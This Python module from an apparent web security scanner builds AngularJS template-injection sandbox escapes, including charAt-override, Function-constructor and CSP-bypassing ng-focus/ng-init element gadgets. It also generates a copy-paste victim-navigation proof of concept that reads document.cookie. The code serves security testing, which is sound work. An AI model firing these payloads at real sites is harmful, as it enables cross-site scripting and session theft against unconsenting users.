"""
Deterministic AngularJS CSTI sandbox-escape SYNTHESIS — pure, browser-free, gateway-free.

The curated ``angular_csti`` / ``angular_no_strings`` vectors in ``xss.yaml`` are canned FULL
payloads: a static cheat-sheet the probe selects from. This module instead BUILDS the escape from
primitive building blocks (``angular_primitives`` in ``xss.yaml``), so ``xss_probe`` can synthesize a
working sandbox escape from scratch — assembling it sub-expression by sub-expression and verifying
each piece against the LIVE target's own ``$parse``/``$eval`` (the tool layer in
``dast/tools/xss_probe_tools.py`` runs that oracle; everything HERE is a pure function over strings,
so the grammar is unit-testable in isolation).

The grammar, decomposed from the published AngularJS 1.x escapes:

  string_builder   ``toString().constructor.fromCharCode(<codes>)``       a string with NO literal —
                                                                          needed when quotes are
                                                                          HTML-encoded near the sink
  charat_override  ``toString().constructor.prototype.charAt=[].join``    swaps the per-char string
                                                                          inspection the expression
                                                                          sandbox relies on
  orderby_trigger  ``[1]|orderBy:<expr>``                                  evaluates ``<expr>`` as the
                                                                          ordering predicate (reaches
                                                                          the sandboxed evaluator)
  function_ctor    ``constructor.constructor(<code>)()``                   Function-constructor code
                                                                          exec — works only where the
                                                                          sandbox is absent/removed
                                                                          (AngularJS 1.0-1.1, 1.6+)

Two strategies, picked by probing the live sandbox:

  * ``constructor`` — Function-constructor code exec. Verified by ``constructor_probe``; used when
    the expression sandbox does not block ``constructor.constructor``.
  * ``charat``      — ``String.prototype.charAt`` override + an ``orderBy`` trigger of a
    ``fromCharCode``-built ``x=<effect>`` assignment. The classic sandboxed-era (1.2-1.5) no-strings
    escape. Verified by ``charat_probe``.

For an oracle step ``<effect>`` is a benign sentinel whose evaluation returns a known value; for the
terminal confirm it is ``alert(<MARK>)``.
"""

from __future__ import annotations

from typing import Dict, List, Tuple
from urllib.parse import urlparse, urlunparse

from dast.payloads.loader import get_value

# ── Benign oracle sentinels (evaluate to a known value, no side effects) ──────────────────────────
# A short alpha token the fromCharCode round-trip must reproduce exactly through the app's evaluator.
SENTINEL_STR = "SYNSEN"

# Default grammar fragments — mirror ``angular_primitives`` in xss.yaml; used verbatim when the YAML
# key is absent so synthesis still works if the library is trimmed.
_DEFAULT_PRIMITIVES: Dict[str, str] = {
    "string_builder": "toString().constructor.fromCharCode",
    "charat_override": "toString().constructor.prototype.charAt=[].join",
    "orderby_trigger": "[1]|orderBy:{EXPR}",
    "function_ctor": "constructor.constructor({CODE})()",
    "effect_template": "x={EFFECT}",
    "key_suffix": "=1",
}


def primitives() -> Dict[str, str]:
    """The Angular primitive building blocks, read from ``angular_primitives`` in xss.yaml with the
    published defaults as a fallback (so a trimmed library never breaks synthesis)."""
    lib = get_value("xss", "angular_primitives", {}) or {}
    return {name: (lib.get(name) or default) for name, default in _DEFAULT_PRIMITIVES.items()}


# ── String builder (no-strings) ───────────────────────────────────────────────────────────────────

def char_codes(s: str) -> List[int]:
    """The ``fromCharCode`` numeric sequence for ``s`` (one code point per character)."""
    return [ord(c) for c in s]


def fromcharcode_expr(s: str) -> str:
    """An Angular expression that builds the string ``s`` with NO string literal, via
    ``String.fromCharCode`` reached through ``toString().constructor`` — e.g. ``x=alert(1)`` becomes
    ``toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)``."""
    codes = ",".join(str(c) for c in char_codes(s))
    return f"{primitives()['string_builder']}({codes})"


def effect_string(effect: str) -> str:
    """The assignment the ``orderBy`` trigger evaluates — ``x=<effect>`` by default."""
    return primitives()["effect_template"].replace("{EFFECT}", effect)


# ── Escape builders ────────────────────────────────────────────────────────────────────────────────

def constructor_payload(effect: str, *, strings_ok: bool) -> str:
    """Function-constructor escape ``constructor.constructor(<code>)()`` whose ``<code>`` runs
    ``effect`` (e.g. ``alert(1)``). The code is a string literal when raw quotes survive, else it is
    built with ``fromCharCode`` so no literal quote is needed."""
    code = f"'{effect}'" if strings_ok else fromcharcode_expr(effect)
    return primitives()["function_ctor"].replace("{CODE}", code)


def charat_payload(effect: str, *, key_delivery: bool) -> str:
    """Sandboxed-era no-strings escape: override ``charAt`` on ``String.prototype``, then
    ``orderBy``-trigger a ``fromCharCode``-built ``x=<effect>`` assignment. With ``key_delivery`` the
    trailing ``=1`` KEY→value separator is appended so the whole expression can be delivered AS a
    query-param key (see ``_build_angular_key_url`` in the tool layer)."""
    prims = primitives()
    trigger = prims["orderby_trigger"].replace("{EXPR}", fromcharcode_expr(effect_string(effect)))
    expr = f"{prims['charat_override']};{trigger}"
    return f"{expr}{prims['key_suffix']}" if key_delivery else expr


# ── Oracle probes: (expression, expected stringified result) ────────────────────────────────────────

def oracle_probe() -> Tuple[str, str]:
    """Establishes the sink actually evaluates Angular expressions: ``7*7`` must yield ``49``."""
    return ("7*7", "49")


def fromcharcode_probe() -> Tuple[str, str]:
    """Verifies the ``fromCharCode`` string builder is reachable and round-trips a known sentinel."""
    return (fromcharcode_expr(SENTINEL_STR), SENTINEL_STR)


def constructor_probe() -> Tuple[str, str]:
    """Probes the Function-constructor path benignly: ``constructor.constructor(<code>)()`` where
    ``<code>`` (built with ``fromCharCode``, so no literal) is ``return "<sentinel>"``. Returns the
    sentinel when the sandbox does not block ``constructor.constructor`` (no-sandbox eras)."""
    code = fromcharcode_expr(f'return "{SENTINEL_STR}"')
    return (primitives()["function_ctor"].replace("{CODE}", code), SENTINEL_STR)


def charat_probe() -> Tuple[str, str]:
    """Probes the sandboxed-era override path benignly: perform the ``charAt`` override assignment
    (fails with a sandbox ``$parse:isecfld``/``isecfn`` error if disallowed), then read back a
    ``fromCharCode`` sentinel via a ``;`` sequence."""
    prims = primitives()
    return (f"{prims['charat_override']};{fromcharcode_expr(SENTINEL_STR)}", SENTINEL_STR)


# ── AngularJS HTML-element directive gadget (CSTI that survives a script-src CSP) ─────────────────
# When ``ng-app`` bootstraps on a subtree, a server-reflected RAW-HTML value is ``$compile``'d on the
# next digest, so an injected element carrying an Angular EVENT/INIT directive runs an Angular
# EXPRESSION — never inline JS, so a ``script-src`` CSP (or ``ng-csp``) does not block it. The
# expression reaches ``window`` via the orderBy-over-``$event.composedPath()`` gadget:
# ``composedPath()`` yields an array ending in ``window``; the ``orderBy`` string predicate is
# evaluated with each item as context, so ``'(z=alert)(<arg>)'`` resolves ``alert`` as
# ``window.alert`` and fires it. A benign sibling assigns ``window.name`` so synthesis can PROVE the
# element compiled and the directive auto-fired (a window sentinel it reads back) before composing
# the terminal ``alert(<MARK>)``.

_DEFAULT_HTML_PRIMITIVES: Dict[str, str] = {
    "element_seed": '<input id=x autofocus ng-focus="{EXPR}">',
    "ng_init_seed": '<input id=x ng-init="{EXPR}">',
    "orderby_alert": "$event.composedPath()|orderBy:'(z=alert)({ARG})'",
    "orderby_setter": "$event.composedPath()|orderBy:'(z=(name={VAL}))'",
}


def html_primitives() -> Dict[str, str]:
    """The Angular HTML-directive gadget building blocks, read from ``angular_html_primitives`` in
    xss.yaml with the published defaults as a fallback (so a trimmed library never breaks synthesis)."""
    lib = get_value("xss", "angular_html_primitives", {}) or {}
    return {name: (lib.get(name) or default) for name, default in _DEFAULT_HTML_PRIMITIVES.items()}


def _html_seed(trigger: str) -> str:
    """The auto-firing element the gadget rides in: the ``ng-init`` link-time seed (event-free, fires
    at link with zero interaction) when ``trigger == 'ng-init'``, else the ``autofocus``→``ng-focus``
    seed (needs a focus event — delivered + focused programmatically by the tool layer)."""
    prims = html_primitives()
    return prims["ng_init_seed"] if trigger == "ng-init" else prims["element_seed"]


def orderby_alert_expr(arg: str) -> str:
    """The quote-free orderBy/``composedPath`` gadget expression that fires ``alert(arg)`` (``arg`` is
    a numeric MARK, so no string literal is needed inside the single-quoted orderBy predicate)."""
    return html_primitives()["orderby_alert"].replace("{ARG}", str(arg))


def orderby_setter_expr(val: str) -> str:
    """Benign compile/fire-oracle sibling of ``orderby_alert_expr``: via the same escape it sets
    ``window.name = <val>`` (a numeric sentinel) instead of calling ``alert``."""
    return html_primitives()["orderby_setter"].replace("{VAL}", str(val))


# ── Event-FREE (``ng-init``) escapes ─────────────────────────────────────────────────────────────
# ``ng-init`` runs at Angular LINK time, NOT as a DOM event handler, so it has NO ``$event`` — the
# ``$event.composedPath()`` gadget (used for ``ng-focus``) THROWS there and never fires. The ng-init
# trigger therefore reuses the increment-1 no-strings sandbox escape (``charat_payload``), which needs
# no event: it overrides ``String.prototype.charAt`` and ``orderBy``-triggers a ``fromCharCode``-built
# ``x=<effect>`` assignment in the escaped global scope. It auto-fires with ZERO interaction, so it is
# the most reliable trigger once the expression is event-free.

def ng_init_alert_expr(arg: str) -> str:
    """Event-free (no ``$event``) escape that fires ``alert(arg)`` at ng-init link time: the
    increment-1 ``charAt``-override + ``orderBy``-of-``fromCharCode`` escape building ``x=alert(arg)``.
    Contains no ``$event`` and no literal quote, so it is safe inside ``ng-init="..."`` and fires with
    no user interaction when AngularJS links the injected element."""
    return charat_payload(f"alert({arg})", key_delivery=False)


def ng_init_setter_expr(val: str) -> str:
    """Event-free compile/fire-oracle sibling of ``ng_init_alert_expr``: via the same no-``$event``
    escape it assigns ``name=<val>`` (sets ``window.name`` in the escaped global scope) instead of
    calling ``alert`` — the benign sentinel the tool reads back to PROVE the ng-init element compiled
    and linked."""
    return charat_payload(f"name={val}", key_delivery=False)


def html_directive_payload(arg: str, *, trigger: str = "ng-focus") -> str:
    """Compose the full injected element that fires ``alert(arg)`` when the directive auto-fires.
    ``ng-focus`` rides ``autofocus`` and uses the ``$event.composedPath()`` gadget (needs a focus
    event); ``ng-init`` uses the EVENT-FREE no-strings escape (fires at link, no ``$event``)."""
    if trigger == "ng-init":
        return _html_seed("ng-init").replace("{EXPR}", ng_init_alert_expr(arg))
    return _html_seed("ng-focus").replace("{EXPR}", orderby_alert_expr(arg))


def html_sentinel_payload(sentinel: str, *, trigger: str = "ng-focus") -> str:
    """The compile/trigger-oracle element: the same seed, but the gadget sets ``window.name=<sentinel>``
    (``ng-focus`` via ``composedPath``, ``ng-init`` via the event-free escape) so the tool can read it
    back and PROVE the injected markup compiled AND the directive auto-fired."""
    if trigger == "ng-init":
        return _html_seed("ng-init").replace("{EXPR}", ng_init_setter_expr(sentinel))
    return _html_seed("ng-focus").replace("{EXPR}", orderby_setter_expr(sentinel))


def html_sandbox_probe() -> Tuple[str, str]:
    """Scope-safe oracle that the ``orderBy`` string-predicate function-call mechanism (the gadget's
    core) is not sandbox-blocked: ``[1]|orderBy:'(z=toString)()'`` sorts ``[1]`` (the predicate calls
    ``toString`` per item) and stringifies to ``1``. Evaluated through the app's own ``$parse``/
    ``$eval``; a sandbox error surfaces instead of ``1``."""
    return ("[1]|orderBy:'(z=toString)()'", "1")


# ── Exploit-server PoC for the AngularJS-HTML-directive-under-CSP class ───────────────────────────
# This class is NOT self-confirmable by a headless scanner: the real exploit focuses the injected
# ``<input id=x>`` via a URL FRAGMENT (``#x``) in a VICTIM's browser, delivered from an exploit
# server — not by navigating ``?search=`` directly. So instead of a silent miss the probe emits this
# ready-to-use PoC (a SUSPECTED finding), which an operator pastes into the lab's exploit server.

# The focus-fragment element id the gadget and the ``#<id>`` fragment share (``<input id=x ...>#x``).
HTML_GADGET_ELEMENT_ID = "x"


def exploit_server_gadget(arg: str = "document.cookie", *, element_id: str = HTML_GADGET_ELEMENT_ID) -> str:
    """The raw ``<input id=x ng-focus=...>`` element the exploit-server PoC injects. Reuses the same
    quote-free ``$event.composedPath()|orderBy:'(z=alert)(<arg>)'`` gadget the probe fires live (via
    ``orderby_alert_expr``); ``arg`` defaults to ``document.cookie`` to demonstrate exfiltration.
    Carries NO ``autofocus`` — the victim focuses it through the ``#<id>`` URL fragment instead."""
    return f"<input id={element_id} ng-focus={orderby_alert_expr(arg)}>"


def exploit_server_poc(target_url: str, injection_point: str, *, location: str = "query",
                       arg: str = "document.cookie",
                       element_id: str = HTML_GADGET_ELEMENT_ID) -> str:
    """Build the copy-paste exploit-server PoC for the AngularJS-HTML-directive-under-CSP class.

    The returned ``<script>location='...';</script>`` navigates a VICTIM to the real target with the
    ``<input id=x ng-focus=...>`` gadget in ``injection_point`` and a trailing ``#x`` fragment that
    focuses the injected element — firing ``ng-focus`` with no interaction. Mirrors the PortSwigger
    "Reflected XSS with AngularJS sandbox escape and CSP" solution; the gadget is placed RAW (the
    exploit server / victim browser handle transport encoding). Built from the actual target URL +
    injection point so it is ready to paste.

    Example (target ``https://lab/`` , point ``search``)::

        <script>location='https://lab/?search=<input id=x ng-focus=$event.composedPath()\
|orderBy:'(z=alert)(document.cookie)'>#x';</script>
    """
    gadget = exploit_server_gadget(arg, element_id=element_id)
    parts = urlparse(target_url)
    origin = urlunparse(parts._replace(path="", params="", query="", fragment=""))
    path = parts.path or "/"
    victim = f"{origin}{path}?{injection_point}={gadget}#{element_id}"
    return f"<script>location='{victim}';</script>"
